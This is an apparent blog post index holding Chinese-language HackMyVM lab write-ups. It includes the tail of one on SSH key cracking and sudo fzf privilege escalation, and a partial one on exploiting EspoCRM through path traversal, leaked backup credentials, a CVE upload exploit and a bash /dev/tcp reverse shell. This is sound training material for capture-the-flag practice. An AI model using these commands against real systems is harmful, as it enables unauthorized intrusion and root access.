3+PUhSNxJaeN3\nXpArFzvPvI2xpCRaJfcZWHipQs0QxSnCzbPkRGeVZnOWivDtyCH3RL+AU5YqExrNHazeRj\n++ProP34/IqtVQ2MgmKPGLWN7bcHc/yIo1QrI2inTbYfHaJ3CFqkUYIdHO/kYJGipdSdSk\nLY7Mm3XOTlToNR+PqASKmztOAd8pNetkYtdblis7ZLzxijgLW0UxwtcpM8OMPX0auTqIbk\n1y+PikzgeWtXyF3DSJnMkBl+iTfBBcHJAbxnL2MIsrEzOzK1o9fNUEk+h+w6lnZSkB+H+L\nwmOIcTVffLBoj2DJM0NzHglcWCTIzfX4Dxq1mB74nKKjYZHrRpXU2S8e1RQQ+8PaNKdtNA\nObAZfIXEro4r2S+2w64EOMCNE/bemeG+8tPs5gQNyO+g3lAIrCeNsZFaoEHXNXMJ0HhNUr\no1BTAD55khzDpOyAvWhK5Z+PhddCG2jxeAWKP/dbinudpOLVCJUyAjRYhtq+78PVZcuv0a\nuyMBDBaosKD119Wcf4Injv9w7p4s6LTWvYXTgad4RJJWJPVyTHHL/oDmlUvbwNd90+FPkQ\nOJ2fYEuhQUSnyVMyyvl67hp50jSGGNwpgRzvKkRBCBcAC3u+8BaYTwcBoizQ9oQAElQ1K4\nIwfAXMerfQszIQO8ijGGZpnvAEGoLkTe5Rt7T0xpaxynK7I3h2YrwAzJOw/HdHwKUVRMsG\ngMYkFpPoaRxcBrGDNbkh5S55fFI397DXZMd3jAlviy57VjKQE3PvHnLfjZsewgm/wd8lxB\n/Ent8Jv8m+2ERVe/xEN7teIbqkDZ/RIrHw4bQHBnG6sB3obCEG+tN/3kbzJ6GFdzfiP62k\ns36mc0/mgAn/DqV6IUu+puFI3cRm8D1234DKkmWetOhGyu5TCnCUH83VYCwaKXpYddPXL0\nVtVwCw==\n-----END OPENSSH PRIVATE KEY-----\n                                             \n```\n\n\u7701\u4e86\uff0c\u90fd\u4e0d\u7528\u7206\u7834shadow\u4e86\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ ssh2john id_rsa > hash\n                                         \n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nCreated directory: /home/kali/.john\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes\nCost 2 (iteration count) is 16 for all loaded hashes\nWill run 12 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker\n0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan\n\n```\n\n\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u4e0d\u4f1a\u662f\u7528\u8fd9\u4e2a\u5427\n\n![image](assets/image-20250129204242-qkg0s6r.png)\n\n\u8bd5\u8bd5\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ chmod 600 id_rsa \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ ssh bela@192.168.72.129 -i id_rsa\nssh: connect to host 192.168.72.129 port 22: No route to host\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ ssh bela@192.168.72.129 -i id_rsa\nEnter passphrase for key 'id_rsa': \nLinux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Apr 25 10:35:13 2023 from 192.168.0.100\nbela@doll:~$ id\nuid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)\n\n```\n\n# 3.\u63d0\u6743\n\n```\nbela@doll:~$ sudo -l\nMatching Defaults entries for bela on doll:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser bela may run the following commands on doll:\n    (ALL) NOPASSWD: /usr/bin/fzf --listen\\=1337\n\n```\n\n\u200b`fzf`\u200b \u662f\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u6a21\u7cca\u67e5\u627e\u5de5\u5177\uff0c\u5e76\u4e14\u5176 `--listen`\u200b \u9009\u9879\u5141\u8bb8\u5b83\u63a5\u6536\u6765\u81ea\u8fdc\u7a0b\u8fde\u63a5\u7684\u547d\u4ee4\u3002`fzf`\u200b \u652f\u6301 `execute`\u200b \u7ed1\u5b9a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u5305\u62ec\u542f\u52a8 `bash`\u200b \u6216 `sh`\u200b \u4ee5\u83b7\u53d6 root shell\u3002\n\n```\nbela@doll:~$ sudo /usr/bin/fzf --listen=1337\n```\n\n\u53bb\u91cd\u65b0\u767b\u5f55\u4e00\u4e2a\u7a97\u53e3\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/tmp/home/bela/.ssh]\n\u2514\u2500$ ssh bela@192.168.72.129 -i id_rsa   \nEnter passphrase for key 'id_rsa': \nLinux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Jan 30 02:44:26 2025 from 192.168.72.128\n\nbela@doll:~$ curl -X POST --data '{'call':'execute','args':['chmod u+s /bin/bash']}' http://127.0.0.1:1337\nunknown action: {'call':'execute','args':['/bin/bash']}\nbela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337\n\n```\n\n\u6210\u529f\u62ff\u5230root shell\n\n```\nbela@doll:~$ bash -p\nbash-5.1# id\nuid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)\n\n```\n\n\u200dsentence", "top": 0, "createdAt": 1751016783, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P101": {"htmlDir": "docs/post/hmv_espo.html", "labels": ["HackMyVM"], "postTitle": "hmv_espo", "postUrl": "post/hmv_espo.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/101", "commentNum": 0, "wordCount": 37834, "description": "# hmv_espo\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.236\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n---\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS -p- -Pn -n -T4 192.168.205.236\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST\nNmap scan report for 192.168.205.236\nHost is up (0.00024s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            \n```\n\n---\n\n# 2.\u8e29\u70b9\n\n![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)\n\n\u662f\u4e2a\u767b\u5f55\u680f\uff0c\u641c\u7d22\u4e00\u4e0b\u6709\u6ca1\u6709\u4ec0\u4e48\u6f0f\u6d1e\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ whatweb http://192.168.205.236                                     \nhttp://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit EspoCRM\n---------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                      |  Path\n---------------------------------------------------------------------------------------------------- ---------------------------------\nEspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt\n---------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n                                 \n```\n\n\u53ea\u6709\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff0c\u4f46\u662f\u6211\u4eec\u6ca1\u6709\u7528\u6237\u3002\u7206\u7834\u4e00\u4e0b\u76ee\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.236 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.236\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,md,php,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 301) [Size: 162] [--> http://192.168.205.236/admin/]\n/install              (Status: 301) [Size: 162] [--> http://192.168.205.236/install/]\n/api                  (Status: 301) [Size: 162] [--> http://192.168.205.236/api/]\n/index.php            (Status: 200) [Size: 2480]\n/portal               (Status: 301) [Size: 162] [--> http://192.168.205.236/portal/]\n/client               (Status: 301) [Size: 162] [--> http://192.168.205.236/client/]\n/robots.txt           (Status: 200) [Size: 26]\nProgress: 42982 / 311425 (13.80%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 44082 / 311425 (14.15%)\n===============================================================\nFinished\n===============================================================\n                                 \n```\n\n\u53d1\u73b0\u4e00\u70b9\u6709\u610f\u601d\u7684\u4e1c\u897f\n\n![image](https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51)\n\n![image](https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51)\n\n\u8c8c\u4f3c\u53ef\u4ee5\u901a\u8fc7\u7ed5\u8fc7\u8bfb\u53d6\u6587\u4ef6\u5939\u5916\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u7206\u7834\u8bd5\u8bd5\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -u 'http://192.168.205.236/admin../FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  \n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.236/admin../FUZZ\nTotal requests: 62284\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000000003:   301        7 L      11 W       162 Ch      'admin'                                                             \n000004255:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   \n000008002:   301        7 L      11 W       162 Ch      '_oldsite'                                                          \n000030014:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   \n000059104:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   \n\nTotal time: 0\nProcessed Requests: 62284\nFiltered Requests: 62279\nRequests/sec.: 0\n\n              \n```\n\n\u786e\u5b9e\u53ef\u4ee5\uff0c\u6211\u4eec\u7ee7\u7eed\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -u 'http://192.168.205.236/admin../_oldsite/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  \n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.236/admin../_oldsite/FUZZ\nTotal requests: 62284\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000000167:   200        11 L     79 W       540 Ch      'info'                                                              \n000004255:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          \n000030014:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          \n000059104:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          \n\nTotal time: 34.86630\nProcessed Requests: 62284\nFiltered Requests: 62280\nRequests/sec.: 1786.366\n\n                                           \n```\n\n\u6709\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u67e5\u770b\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.236/admin../_oldsite/info\n# Backup Configuration Settings\n# This configuration file dictates the backup protocols for critical data storage.\n\n# Directory for storing backup files\n# All backup files are stored in compressed ZIP format for efficient space usage and security.\n# Ensure that backups are regularly updated and verified for data integrity.\n\nbackup_directory: /admin/_oldsite\nbackup_format: zip\n# Note: The backup directory is designated for ZIP file backups only. \n# Regular maintenance and checks are required to ensure data consistency and reliability.\n                                                                                            \n\u7ffb\u8bd1\n#\u5907\u4efd\u914d\u7f6e\u8bbe\u7f6e\n#\u8be5\u914d\u7f6e\u6587\u4ef6\u89c4\u5b9a\u4e86\u5173\u952e\u6570\u636e\u5b58\u50a8\u7684\u5907\u4efd\u534f\u8bae\u3002\n#\u5907\u4efd\u6587\u4ef6\u5b58\u653e\u76ee\u5f55\n#\u6240\u6709\u5907\u4efd\u6587\u4ef6\u90fd\u4ee5\u538b\u7f29ZIP\u683c\u5f0f\u5b58\u50a8\uff0c\u4ee5\u63d0\u9ad8\u7a7a\u95f4\u4f7f\u7528\u6548\u7387\u548c\u5b89\u5168\u6027\u3002\n\u786e\u4fdd\u5b9a\u671f\u66f4\u65b0\u5907\u4efd\u5e76\u9a8c\u8bc1\u6570\u636e\u5b8c\u6574\u6027\u3002\nbackup_directory:/admin/_oldsite\nbackup_format:zip\n\u6ce8\u610f\uff1a\u6307\u5b9a\u7684\u5907\u4efd\u76ee\u5f55\u4ec5\u7528\u4e8eZIP\u6587\u4ef6\u5907\u4efd\u3002\n#\u9700\u8981\u5b9a\u671f\u7ef4\u62a4\u548c\u68c0\u67e5\uff0c\u786e\u4fdd\u6570\u636e\u7684\u4e00\u81f4\u6027\u548c\u53ef\u9760\u6027\u3002\n```\n\n\u544a\u8bc9\u4e86\u6211\u4eec\u4f1a\u4fdd\u5b58\u5907\u6ce8\u6587\u4ef6\uff0c\u5e76\u4e14\u5907\u4efd\u6587\u4ef6\u4f1a\u4ee5.zip\u4e3a\u540e\u7f00\uff0c\u6211\u4eec\u6839\u636e\u4fe1\u606f\u7206\u7834\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ wfuzz -u 'http://192.168.205.236/admin../_oldsite/FUZZ.zip' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.236/admin../_oldsite/FUZZ.zip\nTotal requests: 62284\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000000066:   200        139379   1377104    36126245    'backup'                                                            \n                         L       W          Ch                                                                              \n\nTotal time: 36.69276\nProcessed Requests: 62284\nFiltered Requests: 62283\nRequests/sec.: 1697.446\n\n                             \n```\n\n\u6211\u4eec\u628a\u5907\u4efd\u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ wget http://192.168.205.236/admin../_oldsite/backup.zip\n--2025-01-08 13:40:14--  http://192.168.205.236/admin../_oldsite/backup.zip\n\u6b63\u5728\u8fde\u63a5 192.168.205.236:80... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a37975754 (36M) [application/zip]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201cbackup.zip\u201d\n\nbackup.zip                        100%[============================================================>]  36.22M  --.-KB/s  \u7528\u65f6 0.08s   \n\n2025-01-08 13:40:14 (464 MB/s) - \u5df2\u4fdd\u5b58 \u201cbackup.zip\u201d [37975754/37975754])\n\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ unzip backup.zip \n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ls\napplication  bootstrap.php    command.php  daemon.php     extension.php  install      public       vendor\nbackup.zip   clear_cache.php  cron.php     data           html           LICENSE.txt  rebuild.php  web.config\nbin          client           custom       EspoCRM-7.2.4  index.php      preload.php  upgrade.php  websocket.php\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cd data \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/data]\n\u2514\u2500$ ls -la\n\u603b\u8ba1 44\ndrwxrwxr-x  7 kali kali 4096 2023\u5e7412\u6708 4\u65e5 .\ndrwxrwxr-x 12 kali kali 4096  1\u6708 8\u65e5 13:40 ..\ndrwxrwxr-x  3 kali kali 4096 2023\u5e7412\u6708 4\u65e5 .backup\ndrwxrwxr-x  3 kali kali 4096 2023\u5e7412\u6708 4\u65e5 cache\n-rw-rw-r--  1 kali kali  972 2023\u5e7412\u6708 4\u65e5 config-internal.php\n-rw-rw-r--  1 kali kali 5711 2023\u5e7412\u6708 4\u65e5 config.php\n-rw-rw-r--  1 kali kali    1 2023\u5e7412\u6708 4\u65e5 .data\ndrwxr-xr-x  2 kali kali 4096 2023\u5e7412\u6708 4\u65e5 logs\ndrwxrwxr-x  2 kali kali 4096 2023\u5e7412\u6708 4\u65e5 tmp\ndrwxrwxr-x  4 kali kali 4096 2023\u5e7412\u6708 4\u65e5 upload\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp/data]\n\u2514\u2500$ cat config.php                                            \n<?php\nreturn [\n  'useCache' => true,\n  'jobMaxPortion' => 15,\n  'jobRunInParallel' => false,\n  'jobPoolConcurrencyNumber' => 8,\n  'daemonMaxProcessNumber' => 5,\n  'daemonInterval' => 10,\n  'daemonProcessTimeout' => 36000,\n  'recordsPerPage' => 20,\n  'recordsPerPageSmall' => 5,\n  'recordsPerPageSelect' => 10,\n  'applicationName' => 'EspoCRM',\n  'version' => '7.2.4',\n  'timeZone' => 'UTC',\n  'dateFormat' => 'DD.MM.YYYY',\n  'timeFormat' => 'HH:mm',\n  'weekStart' => 0,\n  'thousandSeparator' => ',',\n  'decimalMark' => '.',\n  'exportDelimiter' => ',',\n  'currencyList' => [\n    0 => 'EUR'\n  ],\n  'defaultCurrency' => 'EUR',\n  'baseCurrency' => 'EUR',\n  'currencyRates' => [],\n  'outboundEmailIsShared' => true,\n  'outboundEmailFromName' => 'EspoCRM',\n  'outboundEmailFromAddress' => '',\n  'smtpServer' => '',\n  'smtpPort' => 25,\n  'smtpAuth' => true,\n  'smtpSecurity' => '',\n  'smtpUsername' => 'admin',\n  'smtpPassword' => '39Ue4kcVJ#YpaAV24CNmbWU',\n  'language' => 'en_US',\n  'authenticationMethod' => 'Espo',\n  'globalSearchEntityList' => [\n    0 => 'Account',\n    1 => 'Contact',\n    2 => 'Lead',\n    3 => 'Opportunity'\n  ],\n  'tabList' => [\n    0 => 'Account',\n    1 => 'Contact',\n    2 => 'Lead',\n    3 => 'Opportunity',\n    4 => 'Case',\n    5 => 'Email',\n    6 => 'Calendar',\n    7 => 'Meeting',\n    8 => 'Call',\n    9 => 'Task',\n    10 => '_delimiter_',\n    11 => 'Document',\n    12 => 'Campaign',\n    13 => 'KnowledgeBaseArticle',\n    14 => 'Stream',\n    15 => 'User'\n  ],\n  'quickCreateList' => [\n    0 => 'Account',\n    1 => 'Contact',\n    2 => 'Lead',\n    3 => 'Opportunity',\n    4 => 'Meeting',\n    5 => 'Call',\n    6 => 'Task',\n    7 => 'Case',\n    8 => 'Email'\n  ],\n  'exportDisabled' => false,\n  'adminNotifications' => true,\n  'adminNotificationsNewVersion' => true,\n  'adminNotificationsCronIsNotConfigured' => true,\n  'adminNotificationsNewExtensionVersion' => true,\n  'assignmentEmailNotifications' => false,\n  'assignmentEmailNotificationsEntityList' => [\n    0 => 'Lead',\n    1 => 'Opportunity',\n    2 => 'Task',\n    3 => 'Case'\n  ],\n  'assignmentNotificationsEntityList' => [\n    0 => 'Meeting',\n    1 => 'Call',\n    2 => 'Task',\n    3 => 'Email'\n  ],\n  'portalStreamEmailNotifications' => true,\n  'streamEmailNotificationsEntityList' => [\n    0 => 'Case'\n  ],\n  'streamEmailNotificationsTypeList' => [\n    0 => 'Post',\n    1 => 'Status',\n    2 => 'EmailReceived'\n  ],\n  'emailNotificationsDelay' => 30,\n  'emailMessageMaxSize' => 10,\n  'notificationsCheckInterval' => 10,\n  'maxEmailAccountCount' => 2,\n  'followCreatedEntities' => false,\n  'b2cMode' => false,\n  'theme' => 'Espo',\n  'themeParams' => (object) [\n    'navbar' => 'side'\n  ],\n  'massEmailMaxPerHourCount' => 100,\n  'massEmailVerp' => false,\n  'personalEmailMaxPortionSize' => 50,\n  'inboundEmailMaxPortionSize' => 50,\n  'emailAddressLookupEntityTypeList' => [\n    0 => 'User',\n    1 => 'Contact',\n    2 => 'Lead',\n    3 => 'Account'\n  ],\n  'authTokenLifetime' => 0,\n  'authTokenMaxIdleTime' => 48,\n  'userNameRegularExpression' => '[^a-z0-9\\\\-@_\\\\.\\\\s]',\n  'addressFormat' => 1,\n  'displayListViewRecordCount' => true,\n  'dashboardLayout' => [\n    0 => (object) [\n      'name' => 'My Espo',\n      'layout' => [\n        0 => (object) [\n          'id' => 'default-activities',\n          'name' => 'Activities',\n          'x' => 2,\n          'y' => 2,\n          'width' => 2,\n          'height' => 4\n        ],\n        1 => (object) [\n          'id' => 'default-stream',\n          'name' => 'Stream',\n          'x' => 0,\n          'y' => 0,\n          'width' => 2,\n          'height' => 4\n        ]\n      ]\n    ]\n  ],\n  'calendarEntityList' => [\n    0 => 'Meeting',\n    1 => 'Call',\n    2 => 'Task'\n  ],\n  'activitiesEntityList' => [\n    0 => 'Meeting',\n    1 => 'Call'\n  ],\n  'historyEntityList' => [\n    0 => 'Meeting',\n    1 => 'Call',\n    2 => 'Email'\n  ],\n  'busyRangesEntityList' => [\n    0 => 'Meeting',\n    1 => 'Call'\n  ],\n  'emailAutoReplySuppressPeriod' => '2 hours',\n  'emailAutoReplyLimit' => 5,\n  'cleanupJobPeriod' => '1 month',\n  'cleanupActionHistoryPeriod' => '15 days',\n  'cleanupAuthTokenPeriod' => '1 month',\n  'currencyFormat' => 2,\n  'currencyDecimalPlaces' => 2,\n  'aclAllowDeleteCreated' => false,\n  'aclAllowDeleteCreatedThresholdPeriod' => '24 hours',\n  'attachmentUploadMaxSize' => 256,\n  'attachmentUploadChunkSize' => 4,\n  'inlineAttachmentUploadMaxSize' => 20,\n  'textFilterUseContainsForVarchar' => false,\n  'tabColorsDisabled' => false,\n  'massPrintPdfMaxCount' => 50,\n  'emailKeepParentTeamsEntityList' => [\n    0 => 'Case'\n  ],\n  'streamEmailWithContentEntityTypeList' => [\n    0 => 'Case'\n  ],\n  'recordListMaxSizeLimit' => 200,\n  'noteDeleteThresholdPeriod' => '1 month',\n  'noteEditThresholdPeriod' => '7 days',\n  'emailForceUseExternalClient' => false,\n  'useWebSocket' => false,\n  'auth2FAMethodList' => [\n    0 => 'Totp'\n  ],\n  'personNameFormat' => 'firstLast',\n  'newNotificationCountInTitle' => false,\n  'pdfEngine' => 'Tcpdf',\n  'smsProvider' => NULL,\n  'defaultFileStorage' => 'EspoUploadDir',\n  'ldapUserNameAttribute' => 'sAMAccountName',\n  'ldapUserFirstNameAttribute' => 'givenName',\n  'ldapUserLastNameAttribute' => 'sn',\n  'ldapUserTitleAttribute' => 'title',\n  'ldapUserEmailAddressAttribute' => 'mail',\n  'ldapUserPhoneNumberAttribute' => 'telephoneNumber',\n  'ldapUserObjectClass' => 'person',\n  'ldapPortalUserLdapAuth' => false,\n  'passwordGenerateLength' => 10,\n  'massActionIdleCountThreshold' => 100,\n  'exportIdleCountThreshold' => 1000,\n  'cacheTimestamp' => 1701712486,\n  'microtime' => 1701712486.097623,\n  'siteUrl' => 'http://espo.hmv',\n  'fullTextSearchMinLength' => 4,\n  'appTimestamp' => 1701712486,\n  'maintenanceMode' => NULL,\n  'cronDisabled' => NULL\n];\n                                                    \n```\n\n\u5728data\u6587\u4ef6\u5939\u4e2d\u53d1\u73b0\u4e86\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u4e14\u914d\u7f6e\u6587\u4ef6\u4e2d\u6709\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u6211\u4eec\u5c1d\u8bd5\u767b\u5f55\n\n\u6210\u529f\u8fdb\u5165`EspoCRM`,\u67e5\u770b\u4e00\u4e0b\u4ed6\u7248\u672c\u4fe1\u606f\n\n![image](https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22)\n\n\u641c\u7d22\u8be5\u7248\u672c\u6709\u6ca1\u6709\u6f0f\u6d1e\u3002\u901a\u8fc7\u641c\u7d22\u53d1\u73b0\u5b58\u5728[\u4e0a\u4f20\u6587\u4ef6\u6f0f\u6d1e](https://github.com/josemlwdf/CVE-2023-5965)\uff0c\u6211\u4eec\u5229\u7528\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  \n\u6b63\u514b\u9686\u5230 'CVE-2023-5965'...\nremote: Enumerating objects: 37, done.\nremote: Counting objects: 100% (37/37), done.\nremote: Compressing objects: 100% (34/34), done.\nremote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)\n\u63a5\u6536\u5bf9\u8c61\u4e2d: 100% (37/37), 12.33 KiB | 287.00 KiB/s, \u5b8c\u6210.\n\u5904\u7406 delta \u4e2d: 100% (14/14), \u5b8c\u6210.\n                                             \n```\n\n\u53d1\u73b0\u7b2c\u4e00\u4e2a\u901a\u8fc7\u66f4\u65b0\u65e0\u6548\uff0c\u5c1d\u8bd5\u7b2c\u4e8c\u4e2a\u4e0a\u4f20\u63d2\u4ef6\uff0c\u6210\u529f\u4e0a\u4f20\u5e76\u6709\u53cd\u9988\n\n![image](https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201)\n\n![image](https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1)\n\n\u5f39\u4e00\u4e2a\u53cd\u5f39shell\u56de\u6765\n\n```bash\n# \u6267\u884c\u8bed\u53e5\nbash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1'\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                        \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 35578\nbash: cannot set terminal process group (509): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@espo:~/html/public$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n---\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY 